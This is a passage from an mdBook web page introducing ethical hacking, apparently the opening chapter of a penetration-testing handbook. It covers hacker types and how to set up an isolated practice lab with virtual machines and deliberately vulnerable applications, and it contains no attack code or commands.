<!DOCTYPE HTML>
<html lang="en" class="light" dir="ltr">
    <head>
        <!-- Book generated using mdBook -->
        <meta charset="UTF-8">
        <title>Checklist</title>
        <meta name="robots" content="noindex">


        <!-- Custom HTML head -->
        
        <meta name="description" content="">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <meta name="theme-color" content="#ffffff">

        <link rel="icon" href="favicon.svg">
        <link rel="shortcut icon" href="favicon.png">
        <link rel="stylesheet" href="css/variables.css">
        <link rel="stylesheet" href="css/general.css">
        <link rel="stylesheet" href="css/chrome.css">
        <link rel="stylesheet" href="css/print.css" media="print">

        <!-- Fonts -->
        <link rel="stylesheet" href="FontAwesome/css/font-awesome.css">
        <link rel="stylesheet" href="fonts/fonts.css">

        <!-- Highlight.js Stylesheets -->
        <link rel="stylesheet" href="highlight.css">
        <link rel="stylesheet" href="tomorrow-night.css">
        <link rel="stylesheet" href="ayu-highlight.css">

        <!-- Custom theme stylesheets -->

    </head>
    <body class="sidebar-visible no-js">
    <div id="body-container">
        <!-- Provide site root to javascript -->
        <script>
            var path_to_root = "";
            var default_theme = window.matchMedia("(prefers-color-scheme: dark)").matches ? "navy" : "light";
        </script>

        <!-- Work around some values being stored in localStorage wrapped in quotes -->
        <script>
            try {
                var theme = localStorage.getItem('mdbook-theme');
                var sidebar = localStorage.getItem('mdbook-sidebar');

                if (theme.startsWith('"') && theme.endsWith('"')) {
                    localStorage.setItem('mdbook-theme', theme.slice(1, theme.length - 1));
                }

                if (sidebar.startsWith('"') && sidebar.endsWith('"')) {
                    localStorage.setItem('mdbook-sidebar', sidebar.slice(1, sidebar.length - 1));
                }
            } catch (e) { }
        </script>

        <!-- Set the theme before any content is loaded, prevents flash -->
        <script>
            var theme;
            try { theme = localStorage.getItem('mdbook-theme'); } catch(e) { }
            if (theme === null || theme === undefined) { theme = default_theme; }
            var html = document.querySelector('html');
            html.classList.remove('light')
            html.classList.add(theme);
            var body = document.querySelector('body');
            body.classList.remove('no-js')
            body.classList.add('js');
        </script>

        <input type="checkbox" id="sidebar-toggle-anchor" class="hidden">

        <!-- Hide / unhide sidebar before it is displayed -->
        <script>
            var body = document.querySelector('body');
            var sidebar = null;
            var sidebar_toggle = document.getElementById("sidebar-toggle-anchor");
            if (document.body.clientWidth >= 1080) {
                try { sidebar = localStorage.getItem('mdbook-sidebar'); } catch(e) { }
                sidebar = sidebar || 'visible';
            } else {
                sidebar = 'hidden';
            }
            sidebar_toggle.checked = sidebar === 'visible';
            body.classList.remove('sidebar-visible');
            body.classList.add("sidebar-" + sidebar);
        </script>

        <nav id="sidebar" class="sidebar" aria-label="Table of contents">
            <div class="sidebar-scrollbox">
                <ol class="chapter"><li class="chapter-item expanded affix "><a href="index.html">Introduction</a></li><li class="chapter-item expanded "><a href="foodprinting_and_reconnaissances.html"><strong aria-hidden="true">1.</strong> Foodprinting and Reconnaissances</a></li><li class="spacer"></li><li class="chapter-item expanded affix "><li class="part-title">Checklist</li><li class="chapter-item expanded "><a href="Checklist/Web-App-Pentest-Checklist.html"><strong aria-hidden="true">2.</strong> Web Application</a></li><li class="chapter-item expanded "><a href="Checklist/report_writing.html"><strong aria-hidden="true">3.</strong> Report Writing</a></li><li class="spacer"></li><li class="chapter-item expanded affix "><li class="part-title">Recon</li><li class="chapter-item expanded "><a href="recon/public-info-gathering.html"><strong aria-hidden="true">4.</strong> Public info gathering</a></li><li class="chapter-item expanded "><a href="recon/domain-enum.html"><strong aria-hidden="true">5.</strong> Root domains</a></li><li class="chapter-item expanded "><a href="recon/subdomain-enum/index.html"><strong aria-hidden="true">6.</strong> Subdomain Enum</a></li><li class="chapter-item expanded "><a href="recon/subdomain-enum/subdomain-takeover.html"><strong aria-hidden="true">7.</strong> Subdomain Takeover</a></li><li class="chapter-item expanded "><a href="recon/webs-recon.html"><strong aria-hidden="true">8.</strong> Webs recon</a></li><li class="chapter-item expanded "><a href="recon/network-scanning.html"><strong aria-hidden="true">9.</strong> Network Scanning</a></li><li class="chapter-item expanded "><a href="recon/host-scanning.html"><strong aria-hidden="true">10.</strong> Host Scanning</a></li><li class="chapter-item expanded "><a href="recon/packet-scanning.html"><strong aria-hidden="true">11.</strong> Packet Scanning</a></li><li class="spacer"></li><li class="chapter-item expanded affix "><li class="part-title">Enumeration</li><li class="chapter-item expanded "><a href="enumeration/files.html"><strong aria-hidden="true">12.</strong> Files</a></li><li class="chapter-item expanded "><a href="enumeration/ssl-tls.html"><strong aria-hidden="true">13.</strong> SSL/TLS</a></li><li class="chapter-item expanded "><a href="enumeration/ports.html"><strong aria-hidden="true">14.</strong> Ports</a></li><li class="chapter-item expanded affix "><li class="part-title">Web</li><li class="chapter-item expanded "><a href="enumeration/web/index.html"><strong aria-hidden="true">15.</strong> Web Attacks</a></li><li class="chapter-item expanded "><a href="enumeration/web/general-info.html"><strong aria-hidden="true">16.</strong> General Info</a></li><li class="chapter-item expanded "><a href="enumeration/web/quick-tricks.html"><strong aria-hidden="true">17.</strong> Quick tricks</a></li><li class="chapter-item expanded "><a href="enumeration/web/header-injections.html"><strong aria-hidden="true">18.</strong> Header injections</a></li><li class="chapter-item expanded "><a href="enumeration/web/bruteforcing.html"><strong aria-hidden="true">19.</strong> Bruteforcing</a></li><li class="chapter-item expanded "><a href="enumeration/web/online-hashes-cracked.html"><strong aria-hidden="true">20.</strong> Online hashes cracked</a></li><li class="chapter-item expanded "><a href="enumeration/web/crawl-fuzz.html"><strong aria-hidden="true">21.</strong> Crawl/Fuzz</a></li><li class="chapter-item expanded "><a href="enumeration/web/lfi-rfi.html"><strong aria-hidden="true">22.</strong> LFI/RFI</a></li><li class="chapter-item expanded "><a href="enumeration/web/upload-bypasses.html"><strong aria-hidden="true">23.</strong> File upload</a></li><li class="chapter-item expanded "><a href="enumeration/web/sqli.html"><strong aria-hidden="true">24.</strong> SQLi</a></li><li class="chapter-item expanded "><a href="enumeration/web/ssrf.html"><strong aria-hidden="true">25.</strong> SSRF</a></li><li class="chapter-item expanded "><a href="enumeration/web/open-redirects.html"><strong aria-hidden="true">26.</strong> Open redirects</a></li><li class="chapter-item expanded "><a href="enumeration/web/xss.html"><strong aria-hidden="true">27.</strong> XSS</a></li><li class="chapter-item expanded "><a href="enumeration/web/csp.html"><strong aria-hidden="true">28.</strong> CSP</a></li><li class="chapter-item expanded "><a href="enumeration/web/xxe.html"><strong aria-hidden="true">29.</strong> XXE</a></li><li class="chapter-item expanded "><a href="enumeration/web/cookie-padding.html"><strong aria-hidden="true">30.</strong> Cookie Padding</a></li><li class="chapter-item expanded "><a href="enumeration/web/web-shells.html"><strong aria-hidden="true">31.</strong> Webshells</a></li><li class="chapter-item expanded "><a href="enumeration/web/cors.html"><strong aria-hidden="true">32.</strong> CORS</a></li><li class="chapter-item expanded "><a href="enumeration/web/csrf.html"><strong aria-hidden="true">33.</strong> CSRF</a></li><li class="chapter-item expanded "><a href="enumeration/web/web-cache-poisoning.html"><strong aria-hidden="true">34.</strong> Web Cache Poisoning</a></li><li class="chapter-item expanded "><a href="enumeration/web/broken-links.html"><strong aria-hidden="true">35.</strong> Broken Links</a></li><li class="chapter-item expanded "><a href="enumeration/web/clickjacking.html"><strong aria-hidden="true">36.</strong> Clickjacking</a></li><li class="chapter-item expanded "><a href="enumeration/web/request-smuggling.html"><strong aria-hidden="true">37.</strong> HTTP Request Smuggling</a></li><li class="chapter-item expanded "><a href="enumeration/web/web-sockets.html"><strong aria-hidden="true">38.</strong> Web Sockets</a></li><li class="chapter-item expanded "><a href="enumeration/web/crlf.html"><strong aria-hidden="true">39.</strong> CRLF</a></li><li class="chapter-item expanded "><a href="enumeration/web/idor.html"><strong aria-hidden="true">40.</strong> IDOR</a></li><li class="chapter-item expanded "><a href="enumeration/web/web-cache-deception.html"><strong aria-hidden="true">41.</strong> Web Cache Deception</a></li><li class="chapter-item expanded "><a href="enumeration/web/session-fixation.html"><strong aria-hidden="true">42.</strong> Session fixation</a></li><li class="chapter-item expanded "><a href="enumeration/web/email-attacks.html"><strong aria-hidden="true">43.</strong> Email attacks</a></li><li class="chapter-item expanded "><a href="enumeration/web/pastejacking.html"><strong aria-hidden="true">44.</strong> Pastejacking</a></li><li class="chapter-item expanded "><a href="enumeration/web/parameter-pollution.html"><strong aria-hidden="true">45.</strong> HTTP Parameter pollution</a></li><li class="chapter-item expanded "><a href="enumeration/web/ssti.html"><strong aria-hidden="true">46.</strong> SSTI</a></li><li class="chapter-item expanded "><a href="enumeration/web/prototype-pollution.html"><strong aria-hidden="true">47.</strong> Prototype Pollution</a></li><li class="chapter-item expanded "><a href="enumeration/web/command-injection.html"><strong aria-hidden="true">48.</strong> Command Injection</a></li><li class="chapter-item expanded "><a href="enumeration/web/deserialization.html"><strong aria-hidden="true">49.</strong> Deserialization</a></li><li class="chapter-item expanded "><a href="enumeration/web/dns-rebinding.html"><strong aria-hidden="true">50.</strong> DNS rebinding</a></li><li class="chapter-item expanded affix "><li class="part-title">Web-Service</li><li class="chapter-item expanded "><a href="enumeration/webservices/index.html"><strong aria-hidden="true">51.</strong> Web Technologies</a></li><li class="chapter-item expanded "><a href="enumeration/webservices/apis.html"><strong aria-hidden="true">52.</strong> APIs</a></li><li class="chapter-item expanded "><a href="enumeration/webservices/js.html"><strong aria-hidden="true">53.</strong> JS</a></li><li class="chapter-item expanded "><a href="enumeration/webservices/.net.html"><strong aria-hidden="true">54.</strong> ASP.NET</a></li><li class="chapter-item expanded "><a href="enumeration/webservices/jwt.html"><strong aria-hidden="true">55.</strong> JWT</a></li><li class="chapter-item expanded "><a href="enumeration/webservices/github.html"><strong aria-hidden="true">56.</strong> GitHub</a></li><li class="chapter-item expanded "><a href="enumeration/webservices/gitlab.html"><strong aria-hidden="true">57.</strong> GitLab</a></li><li class="chapter-item expanded "><a href="enumeration/webservices/wafs.html"><strong aria-hidden="true">58.</strong> WAFs</a></li><li class="chapter-item expanded "><a href="enumeration/webservices/firebird.html"><strong aria-hidden="true">59.</strong> Firebird</a></li><li class="chapter-item expanded "><a href="enumeration/webservices/wordpress.html"><strong aria-hidden="true">60.</strong> Wordpress</a></li><li class="chapter-item expanded "><a href="enumeration/webservices/webdav.html"><strong aria-hidden="true">61.</strong> WebDav</a></li><li class="chapter-item expanded "><a href="enumeration/webservices/joomla.html"><strong aria-hidden="true">62.</strong> Joomla</a></li><li class="chapter-item expanded "><a href="enumeration/webservices/jenkins.html"><strong aria-hidden="true">63.</strong> Jenkins</a></li><li class="chapter-item expanded "><a href="enumeration/webservices/iis.html"><strong aria-hidden="true">64.</strong> IIS</a></li><li class="chapter-item expanded "><a href="enumeration/webservices/vhosts.html"><strong aria-hidden="true">65.</strong> VHosts</a></li><li class="chapter-item expanded "><a href="enumeration/webservices/firebase.html"><strong aria-hidden="true">66.</strong> Firebase</a></li><li class="chapter-item expanded "><a href="enumeration/webservices/owa.html"><strong aria-hidden="true">67.</strong> OWA</a></li><li class="chapter-item expanded "><a href="enumeration/webservices/oauth.html"><strong aria-hidden="true">68.</strong> OAuth</a></li><li class="chapter-item expanded "><a href="enumeration/webservices/flask.html"><strong aria-hidden="true">69.</strong> Flask</a></li><li class="chapter-item expanded "><a href="enumeration/webservices/symfony-and-and-twig.html"><strong aria-hidden="true">70.</strong> Symfony && Twig</a></li><li class="chapter-item expanded "><a href="enumeration/webservices/drupal.html"><strong aria-hidden="true">71.</strong> Drupal</a></li><li class="chapter-item expanded "><a href="enumeration/webservices/nosql-and-and-mongodb.html"><strong aria-hidden="true">72.</strong> NoSQL (MongoDB, CouchDB)</a></li><li class="chapter-item expanded "><a href="enumeration/webservices/php.html"><strong aria-hidden="true">73.</strong> PHP</a></li><li class="chapter-item expanded "><a href="enumeration/webservices/ror-ruby-on-rails.html"><strong aria-hidden="true">74.</strong> RoR (Ruby on Rails)</a></li><li class="chapter-item expanded "><a href="enumeration/webservices/jboss-java-deserialization.html"><strong aria-hidden="true">75.</strong> JBoss - Java Deserialization</a></li><li class="chapter-item expanded "><a href="enumeration/webservices/onelogin-saml-login.html"><strong aria-hidden="true">76.</strong> OneLogin - SAML Login</a></li><li class="chapter-item expanded "><a href="enumeration/webservices/flash-swf.html"><strong aria-hidden="true">77.</strong> Flash SWF</a></li><li class="chapter-item expanded "><a href="enumeration/webservices/nginx.html"><strong aria-hidden="true">78.</strong> Nginx</a></li><li class="chapter-item expanded "><a href="enumeration/webservices/python.html"><strong aria-hidden="true">79.</strong> Python</a></li><li class="chapter-item expanded "><a href="enumeration/webservices/tomcat.html"><strong aria-hidden="true">80.</strong> Tomcat</a></li><li class="chapter-item expanded "><a href="enumeration/webservices/adobe-aem.html"><strong aria-hidden="true">81.</strong> Adobe AEM</a></li><li class="chapter-item expanded "><a href="enumeration/webservices/magento.html"><strong aria-hidden="true">82.</strong> Magento</a></li><li class="chapter-item expanded "><a href="enumeration/webservices/sap.html"><strong aria-hidden="true">83.</strong> SAP</a></li><li class="chapter-item expanded "><a href="enumeration/webservices/mfa.html"><strong aria-hidden="true">84.</strong> MFA</a></li><li class="chapter-item expanded "><a href="enumeration/webservices/gwt.html"><strong aria-hidden="true">85.</strong> GWT</a></li><li class="chapter-item expanded "><a href="enumeration/webservices/jira.html"><strong aria-hidden="true">86.</strong> Jira</a></li><li class="chapter-item expanded "><a href="enumeration/webservices/oidc-open-id-connect.html"><strong aria-hidden="true">87.</strong> OIDC (Open ID Connect)</a></li><li class="chapter-item expanded "><a href="enumeration/webservices/elk.html"><strong aria-hidden="true">88.</strong> ELK</a></li><li class="chapter-item expanded "><a href="enumeration/webservices/sharepoint.html"><strong aria-hidden="true">89.</strong> Sharepoint</a></li><li class="chapter-item expanded "><a href="enumeration/webservices/others.html"><strong aria-hidden="true">90.</strong> Others</a></li><li class="chapter-item expanded affix "><li class="part-title">Cloud</li><li class="chapter-item expanded "><a href="enumeration/cloud/index.html"><strong aria-hidden="true">91.</strong> Cloud</a></li><li class="chapter-item expanded "><a href="enumeration/cloud/general.html"><strong aria-hidden="true">92.</strong> General</a></li><li class="chapter-item expanded "><a href="enumeration/cloud/cloud-info-recon.html"><strong aria-hidden="true">93.</strong> Cloud Info Gathering</a></li><li class="chapter-item expanded "><a href="enumeration/cloud/aws.html"><strong aria-hidden="true">94.</strong> AWS</a></li><li class="chapter-item expanded "><a href="enumeration/cloud/azure.html"><strong aria-hidden="true">95.</strong> Azure</a></li><li class="chapter-item expanded "><a href="enumeration/cloud/gcp.html"><strong aria-hidden="true">96.</strong> GCP</a></li><li class="chapter-item expanded "><a href="enumeration/cloud/docker-and-and-kubernetes.html"><strong aria-hidden="true">97.</strong> Docker && Kubernetes</a></li><li class="chapter-item expanded "><a href="enumeration/cloud/cdn-comain-fronting.html"><strong aria-hidden="true">98.</strong> CDN - Comain Fronting</a></li><li class="spacer"></li><li class="chapter-item expanded affix "><li class="part-title">Exploitation</li><li class="chapter-item expanded "><a href="exploitation/payloads.html"><strong aria-hidden="true">99.</strong> Payloads</a></li><li class="chapter-item expanded "><a href="exploitation/reverse-shells.html"><strong aria-hidden="true">100.</strong> Reverse Shells</a></li><li class="chapter-item expanded "><a href="exploitation/file-transfer.html"><strong aria-hidden="true">101.</strong> File transfer</a></li><li class="spacer"></li><li class="chapter-item expanded affix "><li class="part-title">Post-Exploitation</li><li class="chapter-item expanded "><a href="post-exploitation/linux.html"><strong aria-hidden="true">102.</strong> Linux</a></li><li class="chapter-item expanded "><a href="post-exploitation/pivoting.html"><strong aria-hidden="true">103.</strong> Pivoting</a></li><li class="chapter-item expanded "><a href="post-exploitation/windows/index.html"><strong aria-hidden="true">104.</strong> Windows</a></li><li class="chapter-item expanded "><a href="post-exploitation/windows/ad/index.html"><strong aria-hidden="true">105.</strong> AD</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="post-exploitation/windows/ad/kerberos-attacks.html"><strong aria-hidden="true">105.1.</strong> Kerberos</a></li></ol></li><li class="chapter-item expanded "><a href="post-exploitation/windows/ps-tips-and-tricks.html"><strong aria-hidden="true">106.</strong> PS tips & tricks</a></li><li class="spacer"></li><li class="chapter-item expanded affix "><li class="part-title">Mobile</li><li class="chapter-item expanded "><a href="mobile/general.html"><strong aria-hidden="true">107.</strong> General</a></li><li class="chapter-item expanded "><a href="mobile/android.html"><strong aria-hidden="true">108.</strong> Android</a></li><li class="chapter-item expanded "><a href="mobile/ios.html"><strong aria-hidden="true">109.</strong> iOS</a></li><li class="spacer"></li><li class="chapter-item expanded affix "><li class="part-title">Others</li><li class="chapter-item expanded "><a href="others/burp.html"><strong aria-hidden="true">110.</strong> Burp Suite</a></li><li class="chapter-item expanded "><a href="others/password-cracking.html"><strong aria-hidden="true">111.</strong> Password cracking</a></li><li class="chapter-item expanded "><a href="others/virtualbox.html"><strong aria-hidden="true">112.</strong> VirtualBox</a></li><li class="chapter-item expanded "><a href="others/code-review.html"><strong aria-hidden="true">113.</strong> Code review</a></li><li class="chapter-item expanded "><a href="others/web-checklist.html"><strong aria-hidden="true">114.</strong> Pentesting Web checklist</a></li><li class="chapter-item expanded "><a href="others/internal-pentest.html"><strong aria-hidden="true">115.</strong> Internal Pentest</a></li><li class="chapter-item expanded "><a href="others/web-fuzzers-comparision.html"><strong aria-hidden="true">116.</strong> Web fuzzers review</a></li><li class="chapter-item expanded "><a href="others/recon-suites-review.html"><strong aria-hidden="true">117.</strong> Recon suites review</a></li><li class="chapter-item expanded "><a href="others/subdomain-tools-review.html"><strong aria-hidden="true">118.</strong> Subdomain tools review</a></li><li class="chapter-item expanded "><a href="others/dictionaries.html"><strong aria-hidden="true">119.</strong> Random</a></li><li class="chapter-item expanded "><a href="others/master-assessment-mindmap.html"><strong aria-hidden="true">120.</strong> Master assessment mindmaps</a></li><li class="chapter-item expanded "><a href="others/bugbounty.html"><strong aria-hidden="true">121.</strong> BugBounty</a></li><li class="chapter-item expanded "><a href="others/exploiting.html"><strong aria-hidden="true">122.</strong> Exploiting</a></li><li class="chapter-item expanded "><a href="others/tools-everywhere.html"><strong aria-hidden="true">123.</strong> tools everywhere</a></li></ol>
            </div>
            <div id="sidebar-resize-handle" class="sidebar-resize-handle">
                <div class="sidebar-resize-indicator"></div>
            </div>
        </nav>

        <!-- Track and set sidebar scroll position -->
        <script>
            var sidebarScrollbox = document.querySelector('#sidebar .sidebar-scrollbox');
            sidebarScrollbox.addEventListener('click', function(e) {
                if (e.target.tagName === 'A') {
                    sessionStorage.setItem('sidebar-scroll', sidebarScrollbox.scrollTop);
                }
            }, { passive: true });
            var sidebarScrollTop = sessionStorage.getItem('sidebar-scroll');
            sessionStorage.removeItem('sidebar-scroll');
            if (sidebarScrollTop) {
                // preserve sidebar scroll position when navigating via links within sidebar
                sidebarScrollbox.scrollTop = sidebarScrollTop;
            } else {
                // scroll sidebar to current active section when navigating via "next/previous chapter" buttons
                var activeSection = document.querySelector('#sidebar .active');
                if (activeSection) {
                    activeSection.scrollIntoView({ block: 'center' });
                }
            }
        </script>

        <div id="page-wrapper" class="page-wrapper">

            <div class="page">
                                <div id="menu-bar-hover-placeholder"></div>
                <div id="menu-bar" class="menu-bar sticky">
                    <div class="left-buttons">
                        <label id="sidebar-toggle" class="icon-button" for="sidebar-toggle-anchor" title="Toggle Table of Contents" aria-label="Toggle Table of Contents" aria-controls="sidebar">
                            <i class="fa fa-bars"></i>
                        </label>
                        <button id="theme-toggle" class="icon-button" type="button" title="Change theme" aria-label="Change theme" aria-haspopup="true" aria-expanded="false" aria-controls="theme-list">
                            <i class="fa fa-paint-brush"></i>
                        </button>
                        <ul id="theme-list" class="theme-popup" aria-label="Themes" role="menu">
                            <li role="none"><button role="menuitem" class="theme" id="light">Light</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="rust">Rust</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="coal">Coal</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="navy">Navy</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="ayu">Ayu</button></li>
                        </ul>
                        <button id="search-toggle" class="icon-button" type="button" title="Search. (Shortkey: s)" aria-label="Toggle Searchbar" aria-expanded="false" aria-keyshortcuts="S" aria-controls="searchbar">
                            <i class="fa fa-search"></i>
                        </button>
                    </div>

                    <h1 class="menu-title">Checklist</h1>

                    <div class="right-buttons">
                        <a href="print.html" title="Print this book" aria-label="Print this book">
                            <i id="print-button" class="fa fa-print"></i>
                        </a>

                    </div>
                </div>

                <div id="search-wrapper" class="hidden">
                    <form id="searchbar-outer" class="searchbar-outer">
                        <input type="search" id="searchbar" name="searchbar" placeholder="Search this book ..." aria-controls="searchresults-outer" aria-describedby="searchresults-header">
                    </form>
                    <div id="searchresults-outer" class="searchresults-outer hidden">
                        <div id="searchresults-header" class="searchresults-header"></div>
                        <ul id="searchresults">
                        </ul>
                    </div>
                </div>

                <!-- Apply ARIA attributes after the sidebar and the sidebar toggle button are added to the DOM -->
                <script>
                    document.getElementById('sidebar-toggle').setAttribute('aria-expanded', sidebar === 'visible');
                    document.getElementById('sidebar').setAttribute('aria-hidden', sidebar !== 'visible');
                    Array.from(document.querySelectorAll('#sidebar a')).forEach(function(link) {
                        link.setAttribute('tabIndex', sidebar === 'visible' ? 0 : -1);
                    });
                </script>

                <div id="content" class="content">
                    <main>
                        <h1 id="introduction-to-ethical-hacking"><a class="header" href="#introduction-to-ethical-hacking">Introduction to Ethical Hacking</a></h1>
<h1 id="introduction-to-cybersecurity"><a class="header" href="#introduction-to-cybersecurity">Introduction to Cybersecurity</a></h1>
<h1 id="ethical-hacker-career-roadmap"><a class="header" href="#ethical-hacker-career-roadmap">Ethical Hacker Career Roadmap</a></h1>
<h1 id="hacker-lab-and-environment-setup"><a class="header" href="#hacker-lab-and-environment-setup">Hacker Lab and Environment setup</a></h1>
<h3 id="learning-objectives"><a class="header" href="#learning-objectives">Learning Objectives</a></h3>
<ul>
<li>
<p><a href="index.html#introducing-to-ethical-hacking">Ethical Hacking Basics</a></p>
</li>
<li>
<p><a href="index.html#types-of-hackers">Types of Hackers</a></p>
</li>
<li>
<p><a href="index.html#lab-setup-for-ethical-hacking">Lab Setup for Ethical Hacking</a></p>
</li>
<li>
<p><a href="index.html#hackers-team-membership">Hacker's Team Membership</a></p>
</li>
<li>
<p><a href="index.html#freelancing-in-cybersecurity">Freelancing in Cybersecurity</a></p>
<ul>
<li><a href="index.html#vulnerability-scoring-systems-and-databases">Vulnerability Scoring Systems and Databases</a></li>
</ul>
</li>
<li>
<p><a href="index.html#want-to-become-an-ethical-hacker">Want to Become an Ethical Hacker?</a></p>
</li>
<li>
<p><a href="index.html#some-very-common-hacking-tools">Some Very Common Hacking Tools</a></p>
<ul>
<li><a href="index.html#common-hacking-techniques">Common Hacking Techniques</a></li>
</ul>
</li>
<li>
<p><a href="index.html#hacking-devices">Hacking Devices</a></p>
</li>
<li>
<p><a href="index.html#hacker-lab-setup">Hacker Lab Setup</a></p>
</li>
</ul>
<hr />
<h1 id="introducing-to-ethical-hacking"><a class="header" href="#introducing-to-ethical-hacking">introducing to Ethical hacking</a></h1>
<p>Certified Ethical Hacker A to Z for self learner.</p>
<p>https://www.tutorialspoint.com/ethical_hacking/ethical_hacking_reconnaissance.htm</p>
<p> An ethical hacker, also known as a white-hat hacker, is a cybersecurity professional who legally and ethically attempts to penetrate computer systems, networks, and applications to identify and fix security vulnerabilities. They use their skills to strengthen security measures, protect against malicious hackers, and help organizations safeguard their digital assets. Ethical hackers often perform activities such as penetration testing, vulnerability assessments, and security audits to enhance cybersecurity. Their work plays a crucial role in maintaining the integrity and confidentiality of digital information. </p>
<h1 id="types-of-hackers"><a class="header" href="#types-of-hackers">Types of Hackers</a></h1>
<p><img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTNjF7zSDMVEeokxZOGbIT5PyNZLfUwsPmU8w&amp;usqp=CAU" alt="myImage" /></p>
<p>Hackers can be categorized into several types based on their intent and activities. Understanding these hacker types is crucial for maintaining cybersecurity and protecting digital assets. Here are some common types of hackers:</p>
<h2 id="1-black-hat-hackers"><a class="header" href="#1-black-hat-hackers">1. Black Hat Hackers</a></h2>
<ul>
<li><strong>Intent:</strong> Malicious and illegal activities, such as unauthorized system breaches, data theft, or causing harm.</li>
<li><strong>Actions:</strong> Engage in criminal hacking with the goal of personal gain or damage.</li>
</ul>
<h2 id="2-white-hat-hackers"><a class="header" href="#2-white-hat-hackers">2. White Hat Hackers</a></h2>
<ul>
<li><strong>Intent:</strong> Ethical hackers who legally identify and fix security vulnerabilities to enhance cybersecurity.</li>
<li><strong>Actions:</strong> Hired by organizations to strengthen security defenses through activities like penetration testing.</li>
</ul>
<h2 id="3-grey-hat-hackers"><a class="header" href="#3-grey-hat-hackers">3. Grey Hat Hackers</a></h2>
<ul>
<li><strong>Intent:</strong> Activities fall between black-hat and white-hat hackers, often without explicit authorization.</li>
<li><strong>Actions:</strong> May disclose vulnerabilities they find but operate in a legally ambiguous space.</li>
</ul>
<h2 id="4-hacktivists"><a class="header" href="#4-hacktivists">4. Hacktivists</a></h2>
<ul>
<li><strong>Intent:</strong> Use hacking skills to promote political or social causes.</li>
<li><strong>Actions:</strong> Target organizations or individuals they believe act against their causes, with actions often straddling legality.</li>
</ul>
<h2 id="5-script-kiddies"><a class="header" href="#5-script-kiddies">5. Script Kiddies</a></h2>
<ul>
<li><strong>Intent:</strong> Limited technical skills, relying on pre-written scripts or tools.</li>
<li><strong>Actions:</strong> Often engage in illegal activities without a deep understanding of hacking.</li>
</ul>
<h2 id="6-state-sponsored-hackers"><a class="header" href="#6-state-sponsored-hackers">6. State-Sponsored Hackers</a></h2>
<ul>
<li><strong>Intent:</strong> Employed or supported by governments for cyber espionage or cyber warfare.</li>
<li><strong>Actions:</strong> Operate on behalf of a nation-state, with potentially significant geopolitical consequences.</li>
</ul>
<h2 id="7-phreakers"><a class="header" href="#7-phreakers">7. Phreakers</a></h2>
<ul>
<li><strong>Intent:</strong> Manipulate and exploit telecommunications systems, especially for unauthorized access or free calls.</li>
</ul>
<h2 id="8-cybercriminals"><a class="header" href="#8-cybercriminals">8. Cybercriminals</a></h2>
<ul>
<li><strong>Intent:</strong> Engage in criminal activities for financial gain.</li>
<li><strong>Actions:</strong> Steal data, launch ransomware attacks, commit fraud, or engage in other illegal online activities.</li>
</ul>
<h2 id="9-red-teamers"><a class="header" href="#9-red-teamers">9. Red Teamers</a></h2>
<ul>
<li><strong>Role:</strong> Simulate cyberattacks on organizations to assess and enhance their security posture.</li>
<li><strong>Actions:</strong> Work alongside blue teamers who defend against these simulated attacks.</li>
</ul>
<h2 id="10-bug-bounty-hunters"><a class="header" href="#10-bug-bounty-hunters">10. Bug Bounty Hunters</a></h2>
<ul>
<li><strong>Role:</strong> Actively search for and report security vulnerabilities in software or websites.</li>
<li><strong>Actions:</strong> Do this legally and often receive rewards or bounties for their findings.</li>
</ul>
<p>Understanding the motivations and actions of these hacker types is essential for developing effective cybersecurity strategies and protecting digital environments.</p>
<h1 id="lab-setup-for-ethical-hacking"><a class="header" href="#lab-setup-for-ethical-hacking">Lab Setup for Ethical Hacking</a></h1>
<p><img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQFMd1v_6nryNGx4WU1w3smDSVxKFFdaqB-xQ&amp;usqp=CAU" alt="myImage" /></p>
<p>Setting up a dedicated lab environment for ethical hacking is essential for practicing and honing your skills without risking real systems. Here's a step-by-step guide on how to set up your ethical hacking lab:</p>
<h2 id="hardware-and-software"><a class="header" href="#hardware-and-software">Hardware and Software</a></h2>
<ul>
<li>
<p><strong>Hardware:</strong> Ensure you have a powerful computer with sufficient RAM and storage to run virtual machines (VMs).</p>
</li>
<li>
<p><strong>Virtualization Software:</strong> Install virtualization software like VMware Workstation or Oracle VirtualBox to create and manage VMs.</p>
</li>
<li>
<p><strong>Operating Systems:</strong> Set up various operating systems, including Windows, Linux (e.g., Kali Linux, Ubuntu), and vulnerable systems (e.g., Metasploitable).</p>
</li>
</ul>
<h2 id="network-configuration"><a class="header" href="#network-configuration">Network Configuration</a></h2>
<ul>
<li>
<p><strong>Virtual Network:</strong> Create a virtual network within your virtualization software to isolate your lab environment from your production network.</p>
</li>
<li>
<p><strong>Router and Firewall:</strong> Use software routers or firewall VMs to simulate network configurations and segmentation.</p>
</li>
</ul>
<h2 id="lab-components"><a class="header" href="#lab-components">Lab Components</a></h2>
<ul>
<li>
<p><strong>Kali Linux:</strong> Install Kali Linux as your primary ethical hacking operating system, preloaded with a variety of hacking tools.</p>
</li>
<li>
<p><strong>Metasploitable:</strong> Use Metasploitable VMs to practice exploiting vulnerabilities and running penetration tests.</p>
</li>
<li>
<p><strong>Web Applications:</strong> Set up vulnerable web applications like DVWA (Damn Vulnerable Web Application) or OWASP WebGoat.</p>
</li>
<li>
<p><strong>Capture The Flag (CTF) Challenges:</strong> Find and install CTF challenges and platforms to practice various hacking skills.</p>
</li>
</ul>
<h2 id="networking-tools"><a class="header" href="#networking-tools">Networking Tools</a></h2>
<ul>
<li>
<p>Use tools like Wireshark for network packet analysis.</p>
</li>
<li>
<p>Set up a DNS server to practice DNS-related attacks.</p>
</li>
</ul>
<h2 id="security-tools"><a class="header" href="#security-tools">Security Tools</a></h2>
<ul>
<li>
<p>Install and configure intrusion detection systems (IDS) and intrusion prevention systems (IPS).</p>
</li>
<li>
<p>Use vulnerability scanning tools like Nessus or OpenVAS to identify weaknesses in your lab environment.</p>
</li>
</ul>
<h2 id="practice-safe-practices"><a class="header" href="#practice-safe-practices">Practice Safe Practices</a></h2>
<ul>
<li>
<p>Always operate within the bounds of the law and obtain proper permissions before attempting any penetration tests on real systems.</p>
</li>
<li>
<p>Keep all software and systems in your lab up to date with security patches.</p>
</li>
<li>
<p>Maintain regular backups of your lab VMs and configurations.</p>
